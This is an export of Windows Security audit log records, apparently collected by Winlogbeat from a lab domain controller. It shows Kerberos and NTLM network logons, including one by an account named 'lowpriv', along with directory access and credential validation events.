	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0x63d296	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109619	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:10.807"	"qxC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.746"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x63D296

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0x63d296	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109618	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:10.806"	"qhC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	Logon	4624	"May 28, 2026 @ 20:58:11.746"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019.LOCAL
	Logon ID:		0x63D412
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{be51111d-d37b-ce63-1a45-615fd7354225}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	::1
	Source Port:		0

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	Kerberos	" - "	" - "	" - "	" - "	" - "	"%%1842"	" - "	" - "	" - "	" - "	"%%1833"	" - "	"::1"	0	0	"'-"	"{be51111d-d37b-ce63-1a45-615fd7354225}"	" - "	Kerberos	3	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	"'-"	" - "	" - "	"'-"	" - "	" - "	"'-"	0x0	"'-"	"S-1-0-0"	"LAB2019.LOCAL"	0x0	0x63d412	"'-"	"'-"	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	"'-"	" - "	" - "	"%%1843"	"'-"	" - "	" - "	4624	"Audit Success"	Info	644	"5,620"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109616	Logon	" - "	" - "	" - "	" - "	2
"May 28, 2026 @ 20:58:10.803"	"qRC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	Logon	4624	"May 28, 2026 @ 20:58:11.746"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Delegation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019.LOCAL
	Logon ID:		0x63D31D
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{cf30678a-e5d9-49b8-4174-9bcc7be9e1d6}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	::1
	Source Port:		50460

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	Kerberos	" - "	" - "	" - "	" - "	" - "	"%%1842"	" - "	" - "	" - "	" - "	"%%1840"	" - "	"::1"	50460	0	"'-"	"{cf30678a-e5d9-49b8-4174-9bcc7be9e1d6}"	" - "	Kerberos	3	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	"'-"	" - "	" - "	"'-"	" - "	" - "	"'-"	0x0	"'-"	"S-1-0-0"	"LAB2019.LOCAL"	0x0	0x63d31d	"'-"	"'-"	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	"'-"	" - "	" - "	"%%1843"	"'-"	" - "	" - "	4624	"Audit Success"	Info	644	"5,620"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109610	Logon	" - "	" - "	" - "	" - "	2
"May 28, 2026 @ 20:58:10.800"	"qBC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	Logon	4624	"May 28, 2026 @ 20:58:11.746"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019.LOCAL
	Logon ID:		0x63D296
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{be51111d-d37b-ce63-1a45-615fd7354225}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	192.168.1.251
	Source Port:		50459

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	Kerberos	" - "	" - "	" - "	" - "	" - "	"%%1842"	" - "	" - "	" - "	" - "	"%%1833"	" - "	"192.168.1.251"	50459	0	"'-"	"{be51111d-d37b-ce63-1a45-615fd7354225}"	" - "	Kerberos	3	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	"'-"	" - "	" - "	"'-"	" - "	" - "	"'-"	0x0	"'-"	"S-1-0-0"	"LAB2019.LOCAL"	0x0	0x63d296	"'-"	"'-"	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	"'-"	" - "	" - "	"%%1843"	"'-"	" - "	" - "	4624	"Audit Success"	Info	644	"2,120"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109605	Logon	" - "	" - "	" - "	" - "	2
"May 28, 2026 @ 20:57:49.718"	"pxC8b54ByrYY_kgLS-01"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	Logon	4624	"May 28, 2026 @ 20:57:50.708"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019.LOCAL
	Logon ID:		0x63CC1A
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{be51111d-d37b-ce63-1a45-615fd7354225}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	127.0.0.1
	Source Port:		50456

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	Kerberos	" - "	" - "	" - "	" - "	" - "	"%%1842"	" - "	" - "	" - "	" - "	"%%1833"	" - "	"127.0.0.1"	50456	0	"'-"	"{be51111d-d37b-ce63-1a45-615fd7354225}"	" - "	Kerberos	3	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	"'-"	" - "	" - "	"'-"	" - "	" - "	"'-"	0x0	"'-"	"S-1-0-0"	"LAB2019.LOCAL"	0x0	0x63cc1a	"'-"	"'-"	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	"'-"	" - "	" - "	"%%1843"	"'-"	" - "	" - "	4624	"Audit Success"	Info	644	"3,876"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109585	Logon	" - "	" - "	" - "	" - "	2
"May 28, 2026 @ 20:57:40.308"	"phC8b54ByrYY_kgLS-01"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	Logon	4624	"May 28, 2026 @ 20:57:41.695"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-21-3984567624-304424726-3877085034-1103
	Account Name:		lowpriv
	Account Domain:		LAB2019
	Logon ID:		0x63CAB1
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	192.168.1.218
	Source Port:		36492

Detailed Authentication Information:
	Logon Process:		NtLmSsp 
	Authentication Package:	NTLM
	Transited Services:	-
	Package Name (NTLM only):	NTLM V2
	Key Length:		128

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	NTLM	" - "	" - "	" - "	" - "	" - "	"%%1842"	" - "	" - "	" - "	" - "	"%%1833"	" - "	"192.168.1.218"	36492	128	"NTLM V2"	"{00000000-0000-0000-0000-000000000000}"	" - "	"NtLmSsp "	3	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	"'-"	" - "	" - "	"'-"	" - "	" - "	"'-"	0x0	"'-"	"S-1-0-0"	LAB2019	0x0	0x63cab1	"'-"	"'-"	lowpriv	"S-1-5-21-3984567624-304424726-3877085034-1103"	" - "	"'-"	" - "	" - "	"%%1843"	"'-"	" - "	" - "	4624	"Audit Success"	Info	644	"5,620"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109578	Logon	" - "	" - "	" - "	" - "	2
"May 28, 2026 @ 20:57:40.307"	"pRC8b54ByrYY_kgLS-00"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Credential Validation"	4776	"May 28, 2026 @ 20:57:41.695"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"The computer attempted to validate the credentials for an account.

Authentication Package:	MICROSOFT_AUTHENTICATION_PACKAGE_V1_0
Logon Account:	lowpriv
Source Workstation:	
Error Code:	0x0"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"MICROSOFT_AUTHENTICATION_PACKAGE_V1_0"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	lowpriv	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4776	"Audit Success"	Info	644	"5,620"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109577	"Credential Validation"	" - "	" - "	" - "	" - "	-
